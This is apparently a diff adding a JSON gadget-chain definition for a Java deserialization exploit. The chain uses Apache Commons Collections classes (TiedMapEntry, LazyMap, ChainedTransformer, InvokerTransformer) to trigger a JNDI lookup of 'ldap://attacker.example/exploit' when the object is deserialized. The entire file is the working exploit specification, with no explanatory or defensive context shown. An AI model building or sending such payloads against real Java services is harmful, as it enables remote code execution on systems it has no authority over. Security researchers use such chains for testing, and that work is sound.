@@ -1,0 +1,52 @@
+{
+    "chain_type": "CCJndi — HashSet + TiedMapEntry/LazyMap → InitialContext.doLookup (JNDI, no TemplatesImpl)",
+    "root_class": "java.util.HashSet",
+    "root_trigger": "readObject→HashMap.put→TiedMapEntry.hashCode→LazyMap.get",
+    "links": [
+        {
+            "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+            "field_overrides": {
+                "map": {"$ref": "link:1"},
+                "key": "anything"
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.map.LazyMap",
+            "field_overrides": {
+                "map": {},
+                "factory": {"$ref": "link:2"}
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.functors.ChainedTransformer",
+            "field_overrides": {
+                "iTransformers": [
+                    {"$ref": "link:3"},
+                    {"$ref": "link:4"},
+                    {"$ref": "link:5"}
+                ]
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.functors.ConstantTransformer",
+            "field_overrides": {"iConstant": "javax.naming.InitialContext"}
+        },
+        {
+            "class": "org.apache.commons.collections.functors.InvokerTransformer",
+            "field_overrides": {
+                "iMethodName": "getDeclaredMethod",
+                "iParamTypes": ["java.lang.String", "[Ljava.lang.Class;"],
+                "iArgs": ["doLookup", ["java.lang.String"]]
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.functors.InvokerTransformer",
+            "field_overrides": {
+                "iMethodName": "invoke",
+                "iParamTypes": ["java.lang.Object", "[Ljava.lang.Object;"],
+                "iArgs": [null, ["ldap://attacker.example/exploit"]]
+            }
+        }
+    ],
+    "sink_method": "InitialContext.doLookup"
+}
